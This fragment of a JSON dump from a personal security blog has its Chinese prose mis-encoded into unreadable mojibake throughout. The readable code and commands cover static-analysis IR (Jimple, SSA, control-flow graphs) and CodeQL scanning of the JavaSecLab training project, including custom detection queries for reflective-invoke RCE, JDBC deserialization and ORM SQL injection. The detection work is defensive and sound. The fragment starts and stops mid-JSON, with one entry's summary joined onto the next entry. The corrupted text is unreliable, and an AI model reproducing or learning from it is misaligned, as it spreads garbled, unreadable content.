å…¶å®åˆ°è¿™é‡Œä¼šå‘ç°å’Œæ±‡ç¼–è¯­è¨€è¿˜æ˜¯æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ğŸ˜†\nSoot Soot æ˜¯ Java çš„é™æ€åˆ†ææ¡†æ¶ï¼Œå…¶ä¸­çš„ IR å«åš Jimpleï¼Œè¿™ä¸ªjimpleå°±æ˜¯åŸºäºä¸‰åœ°å€ç çš„å½¢å¼\næ¯”å¦‚æœ‰å¦‚ä¸‹javaä»£ç ï¼š\npublic class LoopDemo { public int testLoop() { int sum = 0; // æ ‡å‡†çš„ for å¾ªç¯ï¼šåˆå§‹åŒ–; æ¡ä»¶; æ›´æ–° for (int i = 0; i \u0026lt; 10; i++) { sum = sum + i; } return sum; } } é‚£ä¹ˆè½¬åŒ–ä¸ºJimpleåï¼ˆä¼ªä»£ç ï¼‰\npublic int testLoop() { LoopDemo r0; // \u0026#39;this\u0026#39; æŒ‡é’ˆ int sum, i; // å±€éƒ¨å˜é‡å£°æ˜ r0 := @this: LoopDemo; // è·å– this å¼•ç”¨ sum = 0; // [åˆå§‹åŒ– sum] i = 0; // [for åˆå§‹åŒ–]: i = 0 label1: if i \u0026gt;= 10 goto label2; sum = sum + i; i = i + 1; goto label1; label2: return sum; } è¿™é‡Œåªä¸¾äº†ä¸€ä¸ªforå¾ªç¯çš„ä¾‹å­ï¼Œè¿˜æœ‰å¾ˆå¤šçš„åœºæ™¯ï¼Œå¯ä»¥è‡ªè¡Œå»äº†è§£\nStatic Single Assignment é™æ€å•èµ‹å€¼ï¼ˆSSAï¼‰ï¼Œå°±æ˜¯è®©æ¯æ¬¡å¯¹å˜é‡xèµ‹å€¼éƒ½é‡æ–°ä½¿ç”¨ä¸€ä¸ªæ–°çš„å˜é‡xiï¼Œå¹¶åœ¨åç»­ä½¿ç”¨ä¸­é€‰æ‹©æœ€æ–°çš„å˜é‡\n3AC | SSA p = a + b p1 = a + b q = p - c q1 = p1 - c p = q * d p2 = q1 * d q = p + q q2 = p2 + q1 ä½†æ˜¯åœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼Œä¼šå› ä¸ºä¸åŒæ§åˆ¶æµæ±‡å…¥åˆ°ä¸€ä¸ªå—ï¼Œå¯¼è‡´å¤šä¸ªå˜é‡å¤‡é€‰çš„é—®é¢˜ï¼š\nè¿™é‡Œè§£å†³çš„åŠæ³•å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªåˆå¹¶æ“ä½œç¬¦$\\phi$ï¼ˆphi-functionï¼‰ï¼Œæ ¹æ®æ§åˆ¶æµçš„ä¿¡æ¯ç¡®å®šä½¿ç”¨å“ªä¸ªå˜é‡\nä¸ºä»€ä¹ˆè¦ç”¨ SSA :\næ§åˆ¶æµä¿¡æ¯é—´æ¥åœ°é›†æˆåˆ°äº†ç‹¬ç‰¹å˜é‡åä¸­ å¦‚æœæœ‰äº›å¯¹æ§åˆ¶æµä¸æ•æ„Ÿçš„ç®€åŒ–åˆ†æï¼Œå°±å¯ä»¥å€ŸåŠ©äº SSA å®šä¹‰ä¸ä½¿ç”¨æ˜¯æ˜¾å¼çš„ æ›´æœ‰æ•ˆç‡çš„æ•°æ®å­˜å–ä¸ä¼ æ’­ï¼Œæœ‰äº›ä¼˜åŒ–åœ¨åŸºäº SSA æ—¶æ•ˆæœæ›´å¥½ï¼ˆä¾‹å¦‚æ¡ä»¶å¸¸é‡ä¼ æ’­ï¼Œå…¨å±€å˜é‡ç¼–å·ç­‰ï¼‰ ä¸ºä»€ä¹ˆä¸ç”¨ SSA :\nSSA ä¼šå¼•å…¥è¿‡å¤šçš„å˜é‡å’Œ phi å‡½æ•° åœ¨è½¬æ¢æˆæœºå™¨ä»£ç æ—¶ä¼šå¼•å…¥ä½æ•ˆç‡çš„é—®é¢˜ CodeQL ä¸Šé¢æåˆ°ï¼š\nâ€å¦‚æœæœ‰äº›å¯¹æ§åˆ¶æµä¸æ•æ„Ÿçš„ç®€åŒ–åˆ†æï¼Œå°±å¯ä»¥å€ŸåŠ©äº SSAâ€œ\næ­£å› ä¸ºCodeQLéœ€è¦æ±¡ç‚¹è¿½è¸ªè¿™ä¸ªé‡è¦çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å®ƒé€‰æ‹©ä½¿ç”¨SSAæ¥ç®€åŒ–åˆ†ææµç¨‹\nCodeQLå’Œsootçš„é€»è¾‘å¾ˆä¸ä¸€æ ·ï¼Œå®ƒå°†ä»£ç è§£æä¸ºä¸€ä¸ªå­˜å‚¨ASTç»“æ„çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬é€šè¿‡ç¼–å†™æŸ¥è¯¢è¯­å¥ï¼Œåœ¨è¿™ä¸ªæ•°æ®åº“ä¸­æŸ¥è¯¢æ¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œè€Œå½“æˆ‘ä»¬åœ¨ CodeQL ä¸­ä½¿ç”¨ DataFlow æˆ– TaintTracking åº“æ—¶ï¼ŒCodeQL ä¼šåœ¨å†…å­˜ä¸­é€šè¿‡é€»è¾‘æ¨å¯¼æ„å»ºå‡º SSA å½¢å¼çš„æ•°æ®æµå›¾\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç†è§£CodeQLçš„IRå°±æ˜¯å®ƒçš„databaseä»¥åŠSSAå›¾\næ§åˆ¶æµåˆ†æ æ§åˆ¶æµåˆ†æï¼ˆControl Flow Analysisï¼‰é€šå¸¸æŒ‡çš„æ˜¯æ„å»ºæ§åˆ¶æµå›¾ï¼ˆControl Flow Graph, CFGï¼‰ï¼Œå¹¶ä»¥ CFG ä½œä¸ºåŸºç¡€ç»“æ„è¿›è¡Œé™æ€åˆ†æçš„è¿‡ç¨‹\nCFG çš„ä¸€ä¸ªç»“ç‚¹å¯ä»¥æ˜¯ä¸€æ¡å•ç‹¬çš„ 3ACï¼Œä½†æ˜¯æ›´å¸¸è§çš„æ˜¯ä¸€ä¸ªåŸºæœ¬å—ï¼ˆBasic Blockï¼‰\nBasic Blocks åŸºæœ¬å—å°±æ˜¯ä¸€æ®µè¿ç»­ 3ACï¼Œæ»¡è¶³ä¸¤ä¸ªç‰¹å¾ï¼š\nåªèƒ½ä»å—çš„ç¬¬ä¸€æ¡æŒ‡ä»¤è¿›å…¥ åªèƒ½ä»å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ç¦»å¼€ å¦‚ä½•æ„å»ºä¸€ä¸ªåŸºæœ¬å—:\nè¾“å…¥ï¼šç¨‹åº P çš„ä¸€ç³»åˆ— 3AC è¾“å‡ºï¼šç¨‹åº P çš„åŸºæœ¬å— æ–¹æ³• å†³å®š P çš„ leaders P çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å°±æ˜¯ä¸€ä¸ª leader è·³è½¬çš„ç›®æ ‡æŒ‡ä»¤æ˜¯ä¸€ä¸ª leader è·³è½¬æŒ‡ä»¤çš„åä¸€æ¡æŒ‡ä»¤ï¼Œä¹Ÿæ˜¯ä¸€ä¸ª leader æ„å»º P çš„åŸºæœ¬å— ä¸€ä¸ªåŸºæœ¬å—å°±æ˜¯ä¸€ä¸ª leader åŠå…¶åç»­ç›´åˆ°ä¸‹ä¸€ä¸ª leader å‰çš„æ‰€æœ‰æŒ‡ä»¤ åˆ©ç”¨ä¸Šé¢çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå¿«çš„æ„å»ºå‡ºåŸºæœ¬å—ï¼Œæ¯”å¦‚è¿™ä¸ªä¾‹å­ï¼š\nControl Flow Graph ä¸Šé¢è®²äº†æ§åˆ¶æµå›¾æ„å»ºçš„ç¬¬ä¸€æ­¥ï¼Œæ„å»ºåŸºæœ¬å—\nè€Œé™¤äº†åŸºæœ¬å—ï¼ŒCFG ä¸­è¿˜ä¼šæœ‰å—åˆ°å—çš„è¾¹ã€‚å— A å’Œå— B ä¹‹é—´æœ‰ä¸€æ¡è¾¹ï¼Œåªæœ‰è¿™ä¸¤ç§æƒ…å†µï¼š\nA çš„æœ«å°¾æœ‰ä¸€æ¡æŒ‡å‘äº† B å¼€å¤´çš„è·³è½¬æŒ‡ä»¤ã€‚ A çš„æœ«å°¾ç´§æ¥ç€ B çš„å¼€å¤´ï¼Œä¸” A çš„æœ«å°¾ä¸æ˜¯ä¸€æ¡æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ æ³¨æ„åˆ°æ¯ä¸ªåŸºæœ¬å—å’Œå¼€å¤´æŒ‡ä»¤çš„æ ‡å·å”¯ä¸€å¯¹åº”ï¼Œå› æ­¤å¾ˆè‡ªç„¶åœ°ï¼Œæˆ‘ä»¬å¯ä»¥å°†è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡æ”¹ä¸ºåŸºæœ¬å—çš„æ ‡å·è€ŒéæŒ‡ä»¤æ ‡å·\næ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥äº†è§£ä¸€äº›æ¦‚å¿µï¼š\nè‹¥ A -\u0026gt; Bï¼Œåˆ™æˆ‘ä»¬è¯´ A æ˜¯ B çš„å‰é©±ï¼ˆpredecessorï¼‰ï¼ŒB æ˜¯ A çš„åç»§ï¼ˆsuccessorï¼‰ é™¤äº†æ„å»ºå¥½çš„åŸºæœ¬å—ï¼Œæˆ‘ä»¬è¿˜ä¼šé¢å¤–æ·»åŠ ä¸¤ä¸ªç»“ç‚¹ï¼Œã€Œå…¥å£ï¼ˆEntryï¼‰ã€å’Œã€Œå‡ºå£ï¼ˆExitï¼‰ã€ è¿™ä¸¤ä¸ªç»“ç‚¹ä¸å¯¹åº”ä»»ä½• IR å…¥å£æœ‰ä¸€æ¡è¾¹æŒ‡å‘ IR ä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ å¦‚æœä¸€ä¸ªåŸºæœ¬å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ä¼šè®©ç¨‹åºç¦»å¼€è¿™æ®µ IRï¼Œé‚£ä¹ˆè¿™ä¸ªåŸºæœ¬å—å°±ä¼šæœ‰ä¸€æ¡è¾¹æŒ‡å‘å‡ºå£ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ä¸€ä¸ªæ§åˆ¶æµå›¾çš„æ„å»ºï¼š\næ€»ç»“ è‡³æ­¤ï¼Œæˆ‘ä»¬äº†è§£äº†ï¼š\nç¼–è¯‘å™¨ä¸é™æ€åˆ†æå™¨çš„å…³ç³» äº†è§£ 3AC å’Œå…¶é€šå¸¸å½¢å¼ å¦‚ä½•åŸºäº IR æ„å»ºåŸºæœ¬å— å¦‚ä½•åŸºäºåŸºæœ¬å—æ„å»ºæ§åˆ¶æµå›¾ ",
        "summary": "ä¸­é—´è¡¨ç¤ºIR è®²è®²IRï¼ˆIntermediate Representationï¼‰ï¼Œä¸­é—´è¡¨ç¤º\nç¼–è¯‘å™¨ä¸é™æ€åˆ†æå™¨ ç¼–è¯‘å™¨Compilersè´Ÿè´£å°†æºä»£ç ï¼ˆSource codeï¼‰ è½¬æ¢ä¸ºæœºå™¨ä»£ç ï¼ˆMachine Codeï¼‰ï¼Œå¤§è‡´æµç¨‹æ¡†æ¶å¦‚ä¸‹ï¼š\nè¯æ³•åˆ†æå™¨ï¼ˆScannerï¼‰ï¼Œç»“åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œé€šè¿‡è¯æ³•åˆ†æï¼ˆLexical Analysisï¼‰å°† source code ç¿»è¯‘ä¸º tokenã€‚ è¯­æ³•åˆ†æå™¨ï¼ˆParserï¼‰ï¼Œç»“åˆä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ˆContext-Free Grammarï¼‰ï¼Œé€šè¿‡è¯­æ³•åˆ†æï¼ˆSyntax Analysisï¼‰ï¼Œå°† token è§£æä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆAbstract Syntax Tree, ASTï¼‰ è¯­ä¹‰åˆ†æå™¨ï¼ˆType Checkerï¼‰ï¼Œç»“åˆå±æ€§æ–‡æ³•ï¼ˆAttribute Grammarï¼‰ï¼Œé€šè¿‡è¯­ä¹‰åˆ†æï¼ˆSemantic Analysisï¼‰ï¼Œå°† AST è§£æä¸º decorated AST Translatorï¼Œå°† decorated AST ç¿»è¯‘ä¸ºç”Ÿæˆä¸‰åœ°å€ç è¿™æ ·çš„ä¸­é—´è¡¨ç¤ºå½¢å¼ï¼ˆIntermediate Representation, IRï¼‰ï¼Œå¹¶åŸºäº IR åšé™æ€åˆ†æï¼ˆä¾‹å¦‚ä»£ç ä¼˜åŒ–è¿™æ ·çš„å·¥ä½œï¼‰ã€‚ Code Generatorï¼Œå°† IR è½¬æ¢ä¸ºæœºå™¨ä»£ç ã€‚ æµç¨‹å›¾å¦‚ä¸‹ï¼š\ngraph TD %% èŠ‚ç‚¹å®šä¹‰ï¼šæ•°æ®çŠ¶æ€ Src(Source Code) Tok(Token) AST(AST æŠ½è±¡è¯­æ³•æ ‘) DecAST(Decorated AST) IR(\"Intermediate Representation (IR)ä¸‰åœ°å€ç ç­‰\") MC(Machine Code) %% æµç¨‹å®šä¹‰ï¼šè¿çº¿ä»£è¡¨è½¬æ¢è¿‡ç¨‹ï¼Œæ ‡ç­¾æ³¨æ˜äº†[ç»„ä»¶]å’Œ(æ–¹æ³•) Src --\u003e|\"è¯æ³•åˆ†æå™¨ (Scanner)æ–¹æ³•: Lexical Analysis + æ­£åˆ™è¡¨è¾¾å¼\"| Tok Tok --\u003e|\"è¯­æ³•åˆ†æå™¨ (Parser)æ–¹æ³•: Syntax Analysis + ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³• (CFG)\"| AST AST --\u003e|\"è¯­ä¹‰åˆ†æå™¨ (Type Checker)æ–¹æ³•: Semantic Analysis + å±æ€§æ–‡æ³•\"| DecAST DecAST --\u003e|\"è½¬æ¢å™¨ (Translator)æ–¹æ³•: IR Generation + é™æ€åˆ†æ (Static Analysis)\"| IR IR --\u003e|\"ä»£ç ç”Ÿæˆå™¨ (Code Generator)æ–¹æ³•: Code Generation\"| MC %% æ ·å¼ç¾åŒ– style Src fill:#f9f,stroke:#333,stroke-width:2px style MC fill:#f9f,stroke:#333,stroke-width:2px style Tok fill:#e3f2fd,stroke:#1565c0 style AST fill:#e3f2fd,stroke:#1565c0 style DecAST fill:#e3f2fd,stroke:#1565c0 style IR fill:#fff9c4,stroke:#fbc02d é™æ€åˆ†æå¾—å…ˆç¡®ä¿è¿™æ˜¯ä¸€ä»½åˆæ ¼çš„ä»£ç ï¼Œç„¶åå†è¿›è¡Œåˆ†æ\n"
    }
,
    {
        "title": "ä½¿ç”¨CodeQLè¿›è¡Œç™½ç›’æ‰«æ",
        "link": "/My-Knowlege-Database/blog/sdl/sast/codeql/%E4%BD%BF%E7%94%A8codeql%E8%BF%9B%E8%A1%8C%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/",
        "content": "ä½¿ç”¨CodeQLè¿›è¡Œç™½ç›’æ‰«æ æ¥ä¸‹æ¥å­¦ç‚¹ä¸ä¸€æ ·çš„ï¼Œä»ä¼ä¸šå®‰å…¨å»ºè®¾è§’åº¦å‡ºå‘ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæ ¹æ®codeQLæä¾›çš„çš„CWEæ¼æ´è§„åˆ™ï¼Œé’ˆå¯¹ä»£ç è¿›è¡Œæ‰«æï¼Œæˆ‘ä»¬é€‰å–ä»¥ä¸‹CWEè§„åˆ™ï¼š\nã€æ³¨å…¥ç±»ã€‘ - SQL Injection (089) - XSS (079) - Command Exec (078) - Expression / Code Injection (094) - SSRF (918) - XXE (611) ã€èµ„æºè®¿é—®ç±»ã€‘ - Path Traversal (22) ã€ååºåˆ—åŒ–ã€‘ - Unsafe Deserialization (502) ã€è®¤è¯æˆæƒã€‘ - Authentication Bypass (287) - Authorization Bypass (807) ã€æ•æ„Ÿä¿¡æ¯ã€‘ - Hardcoded Credentials (798) æ¥ä¸‹æ¥ä»¥https://github.com/whgojp/JavaSecLab/é¡¹ç›®ä¸ºä¾‹\nSQLæ³¨å…¥ æˆ‘ä»¬ä½¿ç”¨codeqlå®˜æ–¹çš„è§„åˆ™è¿›è¡Œsqlæ³¨å…¥æ‰«æï¼ˆè®°å¾—å…ˆæ„å»ºæ•°æ®åº“ï¼‰ï¼š\ncodeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-089 \\ --format=sarif-latest \\ --output=sql.sarif å¯ä»¥çœ‹åˆ°æ‰«æå®Œæˆååœ¨æ–‡ä»¶å¤¹æ–°å¢äº†ä¸€ä¸ªsarifæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯æ‰«æç»“æœæ–‡ä»¶ï¼Œå¯ä»¥åœ¨vscodeä¸‹è½½sarif vieweræ’ä»¶è¿›è¡Œè§£ææŸ¥çœ‹ï¼š åŒç†æˆ‘ä»¬å¯ä»¥æ£€æµ‹å…¶ä»–æ¼æ´\nXXE codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-611 \\ --format=sarif-latest \\ --output=xxe.sarif SSRF codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-918 \\ --format=sarif-latest \\ --output=ssrf.sarif RCE codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-078 \\ --format=sarif-latest \\ --output=rce-command.sarif ä¸å®‰å…¨çš„ååºåˆ—åŒ– codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-502 \\ --format=sarif-latest \\ --output=deserialize.sarif è¿™ä¸ªè§„åˆ™æŒºç‰›é€¼ï¼Œå„ç§ååºåˆ—åŒ–éƒ½ç…§é¡¾åˆ°äº†\nè¡¨è¾¾å¼æ³¨å…¥ é’ˆå¯¹SPELè¿™ç±»\ncodeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-094 \\ --format=sarif-latest \\ --output=spel.sarif XSS codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-079 \\ --format=sarif-latest \\ --output=xss.sarif ç¡¬ç¼–ç  codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-798 \\ --format=sarif-latest \\ --output=cwe-798-hardcoded-credentials.sarif ç›®å½•ç©¿è¶Š/ä»»æ„æ–‡ä»¶ codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-022 \\ --format=sarif-latest \\ --output=cwe-022-path-traversal.sarif è®¤è¯/æˆæƒç»•è¿‡ codeql database analyze ~/tools/CodeQL/db/javasecpro \\ codeql/java-queries:Security/CWE/CWE-287 \\ codeql/java-queries:Security/CWE/CWE-807 \\ --format=sarif-latest \\ --output=auth-and-authorization-bypass.sarif æ¼æŠ¥å¤„ç† é’ˆå¯¹ä¸Šé¢çš„æ‰«æç»“æœï¼Œåˆ†æäº†é¶åœºæºç ï¼Œä¹Ÿåœ¨ä»£ç æ­å»ºçš„å¹³å°ä¸Šè¿›è¡Œäº†éªŒè¯ï¼Œå‘ç°æœ‰ä¸€å®šçš„è¯¯æŠ¥ï¼Œä¸è¿‡å®å¯é”™æ€ä¸å¯æ”¾è¿‡ï¼Œè¿™äº›ç”šè‡³èƒ½å¤Ÿæ‰«æå‡ºæ¥é¶åœºæ²¡æœ‰è€ƒè™‘åˆ°çš„ä¸€äº›åœ°æ–¹çš„æ¼æ´\næ¥ä¸‹æ¥å¤„ç†æ¼æŠ¥çš„æƒ…å†µ\nåå°„è°ƒç”¨è§¦å‘çš„ RCE RCEçš„æƒ…å†µå‡ºç°äº†æ¼æŠ¥ï¼Œå› ä¸ºè¿™é‡Œæ˜¯åå°„è°ƒç”¨çš„ï¼š æˆ‘ä»¬åªèƒ½æ–°å¢ä¸€ä¸ªè§„åˆ™é’ˆå¯¹è¿™ç±»æƒ…å†µï¼Œå¯ä»¥é€‚å½“çš„å®½æ³›ä¸€ç‚¹ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºç”¨æˆ·å¯æ§çš„æ–¹æ³•å‚æ•°è¿›å…¥äº†åå°„è°ƒç”¨ invoke çš„å‚æ•°ï¼š\nimport java from MethodCall invoke, Parameter p where // åå°„æ‰§è¡Œç‚¹ invoke.getMethod().getName() = \u0026#34;invoke\u0026#34; // payload çš„è®¿é—®è¡¨è¾¾å¼ï¼Œå‡ºç°åœ¨ invoke æŸä¸ªå‚æ•°çš„è¡¨è¾¾å¼å­æ ‘ä¸­ and exists(Expr arg | arg = invoke.getArgument(_) and arg.getAChildExpr*() = p.getAnAccess() ) select invoke, p, \u0026#34;Method parameter flows into reflective Method.invoke arguments\u0026#34; è¿™æ ·å°±èƒ½è¦†ç›–æˆ‘ä»¬çš„æ¼æ´ç‚¹ï¼š\njdbcååºåˆ—åŒ– ååºåˆ—åŒ–çš„æ‰«æç»“æœå¹¶æ²¡æœ‰jdbcï¼Œè¡¥å……ä¸€ä¸‹ï¼š\n/** * @name Universal Unsafe Deserialization (Official Sinks + JDBC Sources) * @description Detects unsafe deserialization using official sink definitions plus custom JDBC sources. * @kind path-problem * @id java/universal-unsafe-deserialization-official * @problem.severity error * @security-severity 9.8 * @tags security */ import java import semmle.code.java.dataflow.TaintTracking import semmle.code.java.dataflow.FlowSources // å¼•å…¥å®˜æ–¹åº“ import semmle.code.java.security.UnsafeDeserializationQuery module UniversalDeserializationConfig implements DataFlow::ConfigSig { // 1. Source predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource or exists(MethodCall mc | mc.getMethod().getName().matches(\u0026#34;get%\u0026#34;) and ( mc.getMethod().getDeclaringType().hasName(\u0026#34;ResultSet\u0026#34;) or mc.getMethod().getDeclaringType().(RefType).getASupertype*().hasName(\u0026#34;ResultSet\u0026#34;) or mc.getMethod().getDeclaringType().(RefType).getASupertype*().hasName(\u0026#34;java.sql.ResultSet\u0026#34;) or mc.getMethod().getDeclaringType().hasName(\u0026#34;CallableStatement\u0026#34;) or mc.getMethod().getDeclaringType().(RefType).getASupertype*().hasName(\u0026#34;java.sql.CallableStatement\u0026#34;) ) and src = DataFlow::exprNode(mc) ) } // 2. Sink: ä½¿ç”¨å®˜æ–¹å®šä¹‰çš„ Sink é›†åˆ predicate isSink(DataFlow::Node sink) { sink instanceof UnsafeDeserializationSink } // 3. Additional Steps predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) { // Gap 1: byte[] -\u0026gt; new ByteArrayInputStream(byte[]) exists(ConstructorCall cc | ( cc.getConstructedType().hasName(\u0026#34;java.io.ByteArrayInputStream\u0026#34;) or cc.getConstructedType().hasName(\u0026#34;ByteArrayInputStream\u0026#34;) ) and cc.getArgument(0) = pred.asExpr() and succ.asExpr() = cc ) or // Gap 2: InputStream -\u0026gt; new ObjectInputStream(InputStream) exists(ConstructorCall cc | ( cc.getConstructedType().hasName(\u0026#34;java.io.ObjectInputStream\u0026#34;) or cc.getConstructedType().hasName(\u0026#34;ObjectInputStream\u0026#34;) ) and cc.getArgument(0) = pred.asExpr() and succ.asExpr() = cc ) } predicate isBarrier(DataFlow::Node node) { none() } } module UniversalDeserializationFlow = TaintTracking::Global\u0026lt;UniversalDeserializationConfig\u0026gt;; import UniversalDeserializationFlow::PathGraph from UniversalDeserializationFlow::PathNode source, UniversalDeserializationFlow::PathNode sink where UniversalDeserializationFlow::flowPath(source, sink) select sink.getNode(), source, sink, \u0026#34;Unsafe deserialization detected (Official Sinks + JDBC Source)\u0026#34; è¿™æ ·å°±èƒ½æŠŠjdbcååºåˆ—åŒ–æ‰«å‡ºæ¥ï¼š\nè¿™æ ·å°±å¯ä»¥åœ¨åŸæœ‰åŸºç¡€ä¸Šæ‰«æå‡ºæ¥jdbcååºåˆ—åŒ–äº†\nJPAã€hibernateã€MyBatisçš„SQLæ³¨å…¥ æ¼æ‰äº†è¿™ä»¨ï¼ŒCodeQL çš„ Java åˆ†æéå¸¸ä¾èµ–ç¼–è¯‘ç¯å¢ƒï¼ˆautobuildï¼‰ã€‚å¦‚æœä½ çš„é¡¹ç›®ç¼ºå°‘ jar åŒ…ï¼ˆæ¯”å¦‚æ²¡æœ‰ hibernate-core.jar ï¼‰ï¼ŒCodeQL å°±æ— æ³•è§£æorg.hibernate.Sessionè¿™ä¸ªç±»å‹ï¼Œè€Œå¦‚æœä»£ç é‡Œé¢å†™ sink.getType().hasQualifiedName(\u0026quot;org.hibernate.Session\u0026quot;)ï¼ŒCodeQL ä¼šå› ä¸ºç±»å‹è§£æå¤±è´¥è€Œè¿”å› falseï¼Œå¯¼è‡´æ¼æŠ¥\nå¯ä»¥é‡å†™ä¸€ä¸‹isSinkï¼Œåœ¨å®˜æ–¹çš„åŸºç¡€ä¸Šå¤„ç†ç–‘ä¼¼JPA/Hibernateçš„ç‚¹ï¼Œè¿™é‡Œé¡ºä¾¿ä¹Ÿè€ƒè™‘äº†mybatisçš„æ³¨è§£åœºæ™¯ï¼Œç„¶åå¢åŠ ä¸€ä¸‹æ–­é“¾ä¿®å¤ï¼ˆæ¯”å¦‚å¤æ‚çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼‰ï¼š\n/** * @name Universal SQL Injection (Robust Hybrid Mode) * @description Detects SQL injection using a hybrid approach: official sinks + fuzzy type matching. * @kind path-problem * @id java/universal-sql-injection-robust-fixed * @problem.severity error * @security-severity 9.0 * @tags security */ import java import semmle.code.java.dataflow.TaintTracking import semmle.code.java.dataflow.FlowSources // å¼•å…¥å®˜æ–¹åº“ä»¥å¤ç”¨å…¶ç²¾å‡†å®šä¹‰ import semmle.code.java.security.SqlInjectionQuery module RobustSqlInjectionConfig implements DataFlow::ConfigSig { // 1. Source: è¿œç¨‹è¾“å…¥ predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } // 2. Sink: æ··åˆç­–ç•¥ predicate isSink(DataFlow::Node sink) { // A. å®˜æ–¹ç²¾å‡† Sink sink instanceof QueryInjectionSink or // B. æ¨¡ç³Šç±»å‹ Sink (é’ˆå¯¹ä¾èµ–ç¼ºå¤±åœºæ™¯) exists(MethodCall mc | mc.getMethod().getName() in [ \u0026#34;createQuery\u0026#34;, \u0026#34;createNativeQuery\u0026#34;, \u0026#34;createSQLQuery\u0026#34;, // JPA/Hibernate \u0026#34;executeQuery\u0026#34;, \u0026#34;executeUpdate\u0026#34;, \u0026#34;execute\u0026#34; // JDBC ] and ( mc.getQualifier().getType().getName().matches(\u0026#34;%Session%\u0026#34;) or // Hibernate Session mc.getQualifier().getType().getName().matches(\u0026#34;%EntityManager%\u0026#34;) or // JPA EntityManager mc.getQualifier().getType().getName().matches(\u0026#34;%Query%\u0026#34;) or // Query, TypedQuery mc.getQualifier().getType().getName().matches(\u0026#34;%Statement%\u0026#34;) or // Statement, PreparedStatement mc.getQualifier().getType().getName().matches(\u0026#34;%Template%\u0026#34;) // JdbcTemplate, HibernateTemplate ) and sink.asExpr() = mc.getArgument(0) ) or // C. MyBatis æ³¨è§£ exists(Annotation ann | ann.getType().hasName([\u0026#34;Select\u0026#34;, \u0026#34;Update\u0026#34;, \u0026#34;Insert\u0026#34;, \u0026#34;Delete\u0026#34;]) and exists(string sql, Method method, Parameter param | sql = ann.getValue(\u0026#34;value\u0026#34;).(StringLiteral).getValue() and method = ann.getTarget() and param = method.getParameter(_) and sql.matches(\u0026#34;%${\u0026#34; + param.getName() + \u0026#34;}%\u0026#34;) and sink.asParameter() = param ) ) } //æ–­é“¾ä¿®å¤ predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) { // å­—ç¬¦ä¸²æ‹¼æ¥ exists(AddExpr add | add.getAnOperand() = pred.asExpr() and succ.asExpr() = add ) or exists(MethodCall mc | mc.getMethod().getName() = \u0026#34;append\u0026#34; and mc.getQualifier().getType().hasName(\u0026#34;StringBuilder\u0026#34;) and ( mc.getArgument(0) = pred.asExpr() and succ.asExpr() = mc or pred.asExpr() = mc.getQualifier() and succ.asExpr() = mc ) ) } predicate isBarrier(DataFlow::Node node) { node.getType() instanceof PrimitiveType and not node.getType().hasName(\u0026#34;char\u0026#34;) and not node.getType().hasName(\u0026#34;byte\u0026#34;) } } module RobustSqlFlow = TaintTracking::Global\u0026lt;RobustSqlInjectionConfig\u0026gt;; import RobustSqlFlow::PathGraph from RobustSqlFlow::PathNode source, RobustSqlFlow::PathNode sink where RobustSqlFlow::flowPath(source, sink) select sink.getNode(), source, sink, \u0026#34;SQL Injection detected (Robust Mode)\u0026#34; è¿™é‡Œè¿˜é—æ¼äº†ä¸€ä¸ªåœºæ™¯ï¼Œå°±æ˜¯MyBatisçš„xml Mapperåœºæ™¯ï¼ŒCodeQL çš„æ±¡ç‚¹è¿½è¸ªï¼ˆTaint Trackingï¼‰é€šå¸¸æ˜¯åœ¨ ä¸€ç§è¯­è¨€ å†…éƒ¨è¿›è¡Œçš„ï¼ˆä» Java Controller åˆ° Java Mapperï¼‰ã€‚å½“æ•°æ®æµè¿›å…¥ XML æ–‡ä»¶æ—¶ï¼Œé“¾è·¯å°±æ–­äº†ã€‚CodeQL ä¸ä¼šè‡ªåŠ¨æŠŠ Java æ–¹æ³•è°ƒç”¨å’Œ XML é‡Œçš„ SQL æ ‡ç­¾å…³è”èµ·æ¥\næˆ‘è€ƒè™‘çš„æ€è·¯æ˜¯ â€œè·¨è¯­è¨€å…³è”ä¸è°ƒç”¨ç‚¹é˜»æ–­â€ï¼šé¦–å…ˆåˆ©ç”¨ CodeQL çš„ XML è§£æèƒ½åŠ›ï¼Œé€’å½’éå† MyBatis æ˜ 